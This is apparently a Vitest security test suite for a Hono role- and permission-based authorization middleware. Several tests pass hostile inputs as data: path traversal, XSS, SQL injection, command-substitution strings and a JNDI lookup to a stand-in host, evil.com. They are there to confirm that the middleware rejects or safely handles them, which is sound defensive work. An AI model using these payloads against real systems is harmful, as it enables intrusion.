/**
 * Authorization Middleware Security Tests
 *
 * Comprehensive security testing for authorization-middleware.ts
 * Tests RBAC enforcement, permission checking, role validation, and security edge cases
 */

import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest'
import type { Next } from 'hono'
import {
  authorizationMiddleware,
  requirePermission,
  requireAnyPermission,
  requireAllPermissions,
  requireRole,
  requireAnyRole,
  requireSystemAdmin,
  getAuthorizationContext,
  hasPermissionInContext,
  hasRoleInContext,
  parsePermission,
  hasPermission,
  hasAnyPermission,
  hasAllPermissions,
  hasAnyRole,
  type AuthorizationOptions,
  type Role,
} from '../src/authorization-middleware'

// Mock auth middleware functions
vi.mock('../src/auth-middleware', () => ({
  getAuthContext: vi.fn(),
  getCurrentUser: vi.fn(),
}))

// Mock tenant context
vi.mock('../src/tenant-context', () => ({
  getTenantContext: vi.fn(),
}))

import { getAuthContext, getCurrentUser } from '../src/auth-middleware'
import { getTenantContext } from '../src/tenant-context'

const mockGetAuthContext = vi.mocked(getAuthContext)
const mockGetCurrentUser = vi.mocked(getCurrentUser)
const mockGetTenantContext = vi.mocked(getTenantContext)

// Mock console methods
const consoleSpy = {
  error: vi.spyOn(console, 'error').mockImplementation(() => {}),
  log: vi.spyOn(console, 'log').mockImplementation(() => {}),
}

describe('Security: AuthorizationMiddleware', () => {
  let mockNext: ReturnType<typeof vi.fn> & Next
  let mockContext: any

  beforeEach(() => {
    vi.clearAllMocks()
    mockNext = vi.fn().mockResolvedValue(undefined)
    mockContext = {
      req: { path: '/test' },
      set: vi.fn(),
      get: vi.fn((key: string) => {
        if (key === 'authorization') return mockContext._authzContext
        return null
      }),
      _authzContext: null as any,
    }
  })

  afterEach(() => {
    vi.restoreAllMocks()
  })

  describe('Permission Parsing Security', () => {
    it('should parse valid permission strings correctly', () => {
      expect(parsePermission('users:read')).toEqual({
        resource: 'users',
        action: 'read',
        scope: 'tenant',
      })

      expect(parsePermission('system:config:system')).toEqual({
        resource: 'system',
        action: 'config',
        scope: 'system',
      })

      expect(parsePermission('tenants:manage:tenant')).toEqual({
        resource: 'tenants',
        action: 'manage',
        scope: 'tenant',
      })
    })

    it('should handle malformed permission strings gracefully', () => {
      expect(parsePermission('')).toEqual({
        resource: '',
        action: '',
        scope: 'tenant',
      })

      expect(parsePermission('users')).toEqual({
        resource: 'users',
        action: '',
        scope: 'tenant',
      })

      expect(parsePermission(':read')).toEqual({
        resource: '',
        action: 'read',
        scope: 'tenant',
      })

      expect(parsePermission('users:')).toEqual({
        resource: 'users',
        action: '',
        scope: 'tenant',
      })

      expect(parsePermission('users:read:invalid')).toEqual({
        resource: 'users',
        action: 'read',
        scope: 'tenant', // Falls back to default
      })
    })

    it('should handle permission string injection attempts', () => {
      const maliciousPermissions = [
        '../../../etc/passwd',
        '<script>alert("xss")</script>',
        'users:${jndi:ldap://evil.com/a}',
        'users:read; DROP TABLE users;',
        'users:read`whoami`',
        'users:read$(id)',
      ]

      for (const permission of maliciousPermissions) {
        expect(() => parsePermission(permission)).not.toThrow()
        const parsed = parsePermission(permission)
        expect(parsed).toHaveProperty('resource')
        expect(parsed).toHaveProperty('action')
        expect(parsed).toHaveProperty('scope')
      }
    })
  })

  describe('Permission Checking Logic Security', () => {
    it('should check exact permission matches', () => {
      expect(hasPermission(['users:read'], 'users:read')).toBe(true)
      expect(hasPermission(['users:read'], 'users:write')).toBe(false)
      expect(hasPermission(['users:read'], 'tenants:read')).toBe(false)
    })

    it('should handle wildcard permissions correctly', () => {
      const userPermissions = [
        'users:*',
        'tenants:read',
        'system:*',
        '*:read',
        '*:*',
      ]

      expect(hasPermission(userPermissions, 'users:read')).toBe(true)
      expect(hasPermission(userPermissions, 'users:write')).toBe(true)
      expect(hasPermission(userPermissions, 'users:delete')).toBe(true)
      expect(hasPermission(userPermissions, 'tenants:read')).toBe(true)
      expect(hasPermission(userPermissions, 'tenants:write')).toBe(false)
      expect(hasPermission(userPermissions, 'system:config')).toBe(true)
      expect(hasPermission(userPermissions, 'any-resource:read')).toBe(true)
      expect(hasPermission(userPermissions, 'any-resource:any-action')).toBe(true)
    })

    it('should handle scope-based permissions correctly', () => {
      const userPermissions = ['users:read:tenant', 'system:config:system']

      // System permissions should work everywhere
      expect(hasPermission(userPermissions, 'system:config:tenant')).toBe(true)
      expect(hasPermission(userPermissions, 'system:config:system')).toBe(true)

      // Tenant permissions require scope match
      expect(hasPermission(userPermissions, 'users:read:tenant')).toBe(true)
      expect(hasPermission(userPermissions, 'users:read:system')).toBe(false)
    })

    it('should handle permission escalation attempts', () => {
      const userPermissions = ['users:read:tenant']

      // User should not be able to escalate to admin permissions
      expect(hasPermission(userPermissions, 'users:*')).toBe(false)
      expect(hasPermission(userPermissions, '*:read')).toBe(false)
      expect(hasPermission(userPermissions, 'users:write')).toBe(false)
      expect(hasPermission(userPermissions, 'users:delete')).toBe(false)
      expect(hasPermission(userPermissions, 'system:admin')).toBe(false)
    })

    it('should handle ANY/ALL permission logic correctly', () => {
      const userPermissions = ['users:read', 'tenants:read']

      // ANY logic - at least one permission matches
      expect(hasAnyPermission(userPermissions, ['users:read', 'users:write'])).toBe(
        true,
      )
      expect(hasAnyPermission(userPermissions, ['users:write', 'tenants:write'])).toBe(
        false,
      )

      // ALL logic - all permissions must match
      expect(hasAllPermissions(userPermissions, ['users:read', 'tenants:read'])).toBe(
        true,
      )
      expect(hasAllPermissions(userPermissions, ['users:read', 'users:write'])).toBe(
        false,
      )
    })
  })

  describe('Role Checking Logic Security', () => {
    it('should check role membership correctly', () => {
      const userRoles: Role[] = [
        { id: '1', name: 'admin', permissions: [], isSystemRole: false },
        { id: '2', name: 'user', permissions: [], isSystemRole: false },
      ]

      expect(hasAnyRole(userRoles, ['admin'])).toBe(true)
      expect(hasAnyRole(userRoles, ['user'])).toBe(true)
      expect(hasAnyRole(userRoles, ['guest'])).toBe(false)
      expect(hasAnyRole(userRoles, ['admin', 'guest'])).toBe(true)
      expect(hasAnyRole(userRoles, ['guest', 'moderator'])).toBe(false)
    })

    it('should handle role name injection attempts', () => {
      const userRoles: Role[] = [
        { id: '1', name: 'admin', permissions: [], isSystemRole: false },
      ]

      const maliciousRoleNames = [
        '../../../etc/passwd',
        '<script>alert("xss")</script>',
        'admin; DROP TABLE roles;',
        "' OR '1'='1",
        '${jndi:ldap://evil.com/a}',
      ]

      for (const maliciousName of maliciousRoleNames) {
        expect(hasAnyRole(userRoles, [maliciousName])).toBe(false)
      }
    })

    it('should handle case sensitivity in role names', () => {
      const userRoles: Role[] = [
        { id: '1', name: 'Admin', permissions: [], isSystemRole: false },
      ]

      expect(hasAnyRole(userRoles, ['Admin'])).toBe(true)
      expect(hasAnyRole(userRoles, ['admin'])).toBe(false) // Case sensitive
      expect(hasAnyRole(userRoles, ['ADMIN'])).toBe(false)
    })
  })

  describe('Authentication Requirement Security', () => {
    it('should reject unauthenticated users', async () => {
      mockGetAuthContext.mockReturnValue({
        isAuthenticated: false,
        user: null,
        session: null,
      })

      const middleware = authorizationMiddleware()

      await expect(middleware(mockContext, mockNext)).rejects.toThrow(
        'Authentication required for authorization',
      )

      expect(mockNext).not.toHaveBeenCalled()
    })

    it('should proceed for authenticated users', async () => {
      mockGetAuthContext.mockReturnValue({
        isAuthenticated: true,
        user: {
          id: 'user-1',
          email: 'user@example.com',
          emailVerified: true,
          createdAt: new Date(),
          updatedAt: new Date(),
        },
        session: {
          id: 'session-1',
          userId: 'user-1',
          expiresAt: new Date(),
          token: 'session-token-1',
          createdAt: new Date(),
          updatedAt: new Date(),
        },
      })

      mockGetCurrentUser.mockReturnValue({
        id: 'user-1',
        email: 'user@example.com',
        tenantId: 'tenant-1',
        isSystemAdmin: false,
        emailVerified: true,
        createdAt: new Date(),
        updatedAt: new Date(),
      })

      mockGetTenantContext.mockReturnValue({
        tenantId: 'tenant-1',
        tenantName: 'Test Tenant',
      })

      const middleware = authorizationMiddleware()

      await middleware(mockContext, mockNext)

      expect(mockNext).toHaveBeenCalled()
    })
  })

  describe('Authorization Data Fetching Security', () => {
    it('should handle database fetch errors gracefully', async () => {
      mockGetAuthContext.mockReturnValue({
        isAuthenticated: true,
        user: {
          id: 'user-1',
          email: 'user@example.com',
          emailVerified: true,
          createdAt: new Date(),
          updatedAt: new Date(),
        },
        session: {
          id: 'session-1',
          userId: 'user-1',
          expiresAt: new Date(),
          token: 'session-token-1',
          createdAt: new Date(),
          updatedAt: new Date(),
        },
      })

      mockGetCurrentUser.mockReturnValue({
        id: 'user-1',
        email: 'user@example.com',
        tenantId: 'tenant-1',
        isSystemAdmin: false,
        emailVerified: true,
        createdAt: new Date(),
        updatedAt: new Date(),
      })

      mockGetTenantContext.mockReturnValue({
        tenantId: 'tenant-1',
        tenantName: 'Test Tenant',
      })

      // Mock database error by returning empty permissions/roles
      // In a real implementation, this would be caught in the try-catch
      const middleware = authorizationMiddleware({
        permissions: ['users:read'],
      })

      await middleware(mockContext, mockNext)

      // Should reject due to missing permissions
      expect(mockNext).not.toHaveBeenCalled()
    })

    it('should handle malicious user IDs safely', async () => {
      const maliciousIds = [
        '../../../etc/passwd',
        '<script>alert("xss")</script>',
        "' OR '1'='1",
        '${jndi:ldap://evil.com/a}',
        'null',
        'undefined',
        '{}',
        '[]',
      ]

      for (const maliciousId of maliciousIds) {
        mockGetAuthContext.mockReturnValue({
          isAuthenticated: true,
          user: {
              id: maliciousId,
              email: 'user@example.com',
              emailVerified: true,
              createdAt: new Date(),
              updatedAt: new Date(),
            },
          session: {
          id: 'session-1',
          userId: 'user-1',
          expiresAt: new Date(),
          token: 'session-token-1',
          createdAt: new Date(),
          updatedAt: new Date(),
        },
        })

        mockGetCurrentUser.mockReturnValue({
          id: maliciousId,
          email: 'user@example.com',
          tenantId: 'tenant-1',
          isSystemAdmin: false,
          emailVerified: true,
          createdAt: new Date(),
          updatedAt: new Date(),
        })

        mockGetTenantContext.mockReturnValue({
          tenantId: 'tenant-1',
          tenantName: 'Test Tenant',
        })

        const middleware = authorizationMiddleware()

        // Should not crash with malicious input
        await expect(middleware(mockContext, mockNext)).resolves.not.toThrow()
        mockNext.mockClear()
      }
    })
  })

  describe('Permission Enforcement Security', () => {
    it('should reject users without required permissions', async () => {
      setupAuthenticatedContext()

      const middleware = authorizationMiddleware({
        permissions: ['admin:delete'],
      })

      await expect(middleware(mockContext, mockNext)).rejects.toThrow(
        'Insufficient permissions',
      )

      expect(mockNext).not.toHaveBeenCalled()
    })

    it('should allow users with required permissions', async () => {
      setupAuthenticatedContext(['users:read'])

      const middleware = authorizationMiddleware({
        permissions: ['users:read'],
      })

      await middleware(mockContext, mockNext)

      expect(mockNext).toHaveBeenCalled()
    })

    it('should handle ANY permission mode correctly', async () => {
      setupAuthenticatedContext(['users:read'])

      const middleware = authorizationMiddleware({
        permissions: ['users:read', 'admin:delete'],
        permissionMode: 'any',
      })

      await middleware(mockContext, mockNext)

      expect(mockNext).toHaveBeenCalled()
    })

    it('should handle ALL permission mode correctly', async () => {
      setupAuthenticatedContext(['users:read', 'users:write'])

      const middleware = authorizationMiddleware({
        permissions: ['users:read', 'users:write'],
        permissionMode: 'all',
      })

      await middleware(mockContext, mockNext)

      expect(mockNext).toHaveBeenCalled()
    })

    it('should reject when ALL permissions are not satisfied', async () => {
      setupAuthenticatedContext(['users:read']) // Missing users:write

      const middleware = authorizationMiddleware({
        permissions: ['users:read', 'users:write'],
        permissionMode: 'all',
      })

      await expect(middleware(mockContext, mockNext)).rejects.toThrow(
        'Insufficient permissions',
      )

      expect(mockNext).not.toHaveBeenCalled()
    })
  })

  describe('Role Enforcement Security', () => {
    it('should reject users without required roles', async () => {
      setupAuthenticatedContext([], [{ id: '1', name: 'user', permissions: [] }])

      const middleware = authorizationMiddleware({
        roles: ['admin'],
      })

      await expect(middleware(mockContext, mockNext)).rejects.toThrow(
        'Required roles: admin',
      )

      expect(mockNext).not.toHaveBeenCalled()
    })

    it('should allow users with required roles', async () => {
      setupAuthenticatedContext([], [{ id: '1', name: 'admin', permissions: [] }])

      const middleware = authorizationMiddleware({
        roles: ['admin'],
      })

      await middleware(mockContext, mockNext)

      expect(mockNext).toHaveBeenCalled()
    })

    it('should handle multiple role requirements correctly', async () => {
      setupAuthenticatedContext([], [{ id: '1', name: 'admin', permissions: [] }])

      const middleware = authorizationMiddleware({
        roles: ['admin', 'user'],
      })

      await middleware(mockContext, mockNext)

      expect(mockNext).toHaveBeenCalled()
    })
  })

  describe('System Admin Security', () => {
    it('should reject non-system admins for system admin requirements', async () => {
      setupAuthenticatedContext([], [], false) // Non-admin user

      const middleware = authorizationMiddleware({
        requireSystemAdmin: true,
      })

      await expect(middleware(mockContext, mockNext)).rejects.toThrow(
        'System admin access required',
      )

      expect(mockNext).not.toHaveBeenCalled()
    })

    it('should allow system admins for system admin requirements', async () => {
      setupAuthenticatedContext([], [], true) // System admin user

      const middleware = authorizationMiddleware({
        requireSystemAdmin: true,
      })

      await middleware(mockContext, mockNext)

      expect(mockNext).toHaveBeenCalled()
    })
  })

  describe('Custom Authorization Logic Security', () => {
    it('should execute custom authorization checker', async () => {
      setupAuthenticatedContext()

      const customChecker = vi.fn().mockResolvedValue(true)
      const middleware = authorizationMiddleware({
        customChecker,
      })

      await middleware(mockContext, mockNext)

      expect(customChecker).toHaveBeenCalledWith(
        expect.objectContaining({
          user: expect.any(Object),
          tenant: expect.any(Object),
          roles: expect.any(Array),
          permissions: expect.any(Array),
        }),
      )
      expect(mockNext).toHaveBeenCalled()
    })

    it('should reject when custom checker fails', async () => {
      setupAuthenticatedContext()

      const customChecker = vi.fn().mockResolvedValue(false)
      const middleware = authorizationMiddleware({
        customChecker,
      })

      await expect(middleware(mockContext, mockNext)).rejects.toThrow(
        'Custom authorization failed',
      )

      expect(mockNext).not.toHaveBeenCalled()
    })

    it('should handle custom checker errors', async () => {
      setupAuthenticatedContext()

      const customChecker = vi.fn().mockRejectedValue(new Error('Custom error'))
      const middleware = authorizationMiddleware({
        customChecker,
      })

      await expect(middleware(mockContext, mockNext)).rejects.toThrow(
        'Authorization service unavailable',
      )

      expect(consoleSpy.error).toHaveBeenCalled()
    })
  })

  describe('Path Skipping Security', () => {
    it('should skip authorization for specified paths', async () => {
      const middleware = authorizationMiddleware({
        permissions: ['admin:delete'],
        skipPaths: ['/public', '/health'],
      })

      const paths = ['/public', '/public/assets', '/health', '/health/status']

      for (const path of paths) {
        mockContext.req.path = path
        await middleware(mockContext, mockNext)

        expect(mockNext).toHaveBeenCalled()
        mockNext.mockClear()
      }
    })

    it('should require authorization for non-skip paths', async () => {
      mockGetAuthContext.mockReturnValue({
        isAuthenticated: true,
        user: {
          id: 'user-1',
          email: 'user@example.com',
          emailVerified: true,
          createdAt: new Date(),
          updatedAt: new Date(),
        },
        session: {
          id: 'session-1',
          userId: 'user-1',
          expiresAt: new Date(),
          token: 'session-token-1',
          createdAt: new Date(),
          updatedAt: new Date(),
        },
      })

      const middleware = authorizationMiddleware({
        permissions: ['admin:delete'],
        skipPaths: ['/public'],
      })

      mockContext.req.path = '/private'

      await expect(middleware(mockContext, mockNext)).rejects.toThrow(
        'Insufficient permissions',
      )

      expect(mockNext).not.toHaveBeenCalled()
    })
  })

  describe('Context Management Security', () => {
    it('should set authorization context correctly', async () => {
      setupAuthenticatedContext(['users:read'], [{ id: '1', name: 'admin', permissions: [] }])

      const middleware = authorizationMiddleware()

      await middleware(mockContext, mockNext)

      const authzContext = mockContext.get('authorization')
      expect(authzContext).toEqual({
        user: expect.objectContaining({
          id: 'user-1',
          email: 'user@example.com',
          tenantId: 'tenant-1',
          isSystemAdmin: false,
        }),
        tenant: expect.objectContaining({
          id: 'tenant-1',
          name: 'Test Tenant',
        }),
        roles: expect.any(Array),
        permissions: expect.any(Array),
      })
    })
  })

  describe('Helper Functions Security', () => {
    it('getAuthorizationContext should handle missing context', () => {
      expect(() => getAuthorizationContext(mockContext)).toThrow(
        'Authorization context not found',
      )
    })

    it('hasPermissionInContext should handle missing context safely', () => {
      expect(hasPermissionInContext(mockContext, 'users:read')).toBe(false)
    })

    it('hasRoleInContext should handle missing context safely', () => {
      expect(hasRoleInContext(mockContext, 'admin')).toBe(false)
    })
  })

  describe('Middleware Factory Functions Security', () => {
    it('requirePermission should create correct middleware', async () => {
      setupAuthenticatedContext(['users:read'])

      const middleware = requirePermission('users:read')
      await middleware(mockContext, mockNext)

      expect(mockNext).toHaveBeenCalled()
    })

    it('requireAnyPermission should create correct middleware', async () => {
      setupAuthenticatedContext(['users:read'])

      const middleware = requireAnyPermission(['users:read', 'users:write'])
      await middleware(mockContext, mockNext)

      expect(mockNext).toHaveBeenCalled()
    })

    it('requireAllPermissions should create correct middleware', async () => {
      setupAuthenticatedContext(['users:read', 'users:write'])

      const middleware = requireAllPermissions(['users:read', 'users:write'])
      await middleware(mockContext, mockNext)

      expect(mockNext).toHaveBeenCalled()
    })

    it('requireRole should create correct middleware', async () => {
      setupAuthenticatedContext([], [{ id: '1', name: 'admin', permissions: [] }])

      const middleware = requireRole('admin')
      await middleware(mockContext, mockNext)

      expect(mockNext).toHaveBeenCalled()
    })

    it('requireSystemAdmin should create correct middleware', async () => {
      setupAuthenticatedContext([], [], true)

      const middleware = requireSystemAdmin()
      await middleware(mockContext, mockNext)

      expect(mockNext).toHaveBeenCalled()
    })
  })

  describe('Error Handling and Service Resilience', () => {
    it('should handle middleware errors gracefully', async () => {
      mockGetAuthContext.mockImplementation(() => {
        throw new Error('Auth context error')
      })

      const middleware = authorizationMiddleware()

      await expect(middleware(mockContext, mockNext)).rejects.toThrow(
        'Authorization service unavailable',
      )

      expect(consoleSpy.error).toHaveBeenCalled()
      expect(mockNext).not.toHaveBeenCalled()
    })

    it('should handle next() function errors', async () => {
      setupAuthenticatedContext()

      const error = new Error('Next function failed')
      const failingNext = vi.fn().mockRejectedValue(error)

      const middleware = authorizationMiddleware()

      await expect(middleware(mockContext, failingNext)).rejects.toThrow(error)

      expect(consoleSpy.error).toHaveBeenCalledWith(
        'Authorization middleware error:',
        error,
      )
    })
  })

  describe('Input Validation Security', () => {
    it('should handle invalid options gracefully', async () => {
      setupAuthenticatedContext()

      const invalidOptions = [
        null,
        undefined,
        { permissions: 'invalid' as any },
        { permissionMode: 'invalid' as any },
        { roles: null as any },
        { customChecker: 'invalid' as any },
      ]

      for (const options of invalidOptions) {
        const middleware = authorizationMiddleware(options as any)

        // Should not throw during creation
        expect(typeof middleware).toBe('function')

        // Should handle gracefully during execution
        await expect(middleware(mockContext, mockNext)).resolves.not.toThrow()
        mockNext.mockClear()
      }
    })

    it('should handle malicious permission strings', async () => {
      setupAuthenticatedContext()

      const maliciousPermissions = [
        '../../../etc/passwd',
        '<script>alert("xss")</script>',
        '${jndi:ldap://evil.com/a}',
        'users:read; DROP TABLE users;',
        'users:read`whoami`',
      ]

      for (const permission of maliciousPermissions) {
        const middleware = authorizationMiddleware({
          permissions: [permission],
        })

        await expect(middleware(mockContext, mockNext)).rejects.toThrow(
          'Insufficient permissions',
        )

        mockNext.mockClear()
      }
    })
  })

  // Helper function to set up authenticated context
  function setupAuthenticatedContext(
    permissions: string[] = [],
    roles: Role[] = [],
    isSystemAdmin: boolean = false,
  ) {
    mockGetAuthContext.mockReturnValue({
      isAuthenticated: true,
      user: {
          id: 'user-1',
          email: 'user@example.com',
          emailVerified: true,
          createdAt: new Date(),
          updatedAt: new Date(),
        },
      session: {
          id: 'session-1',
          userId: 'user-1',
          expiresAt: new Date(),
          token: 'session-token-1',
          createdAt: new Date(),
          updatedAt: new Date(),
        },
    })

    mockGetCurrentUser.mockReturnValue({
      id: 'user-1',
      email: 'user@example.com',
      tenantId: 'tenant-1',
      isSystemAdmin,
      emailVerified: true,
      createdAt: new Date(),
      updatedAt: new Date(),
    })

    mockGetTenantContext.mockReturnValue({
      tenantId: 'tenant-1',
      tenantName: 'Test Tenant',
    })

    // Mock the database call to return the specified permissions and roles
    vi.doMock('../src/authorization-middleware', async (importOriginal) => {
      const mod = await importOriginal() as any
      return {
        ...mod,
        getUserAuthorizationData: vi.fn().mockResolvedValue({
          permissions,
          roles,
        }),
      }
    })
  }
})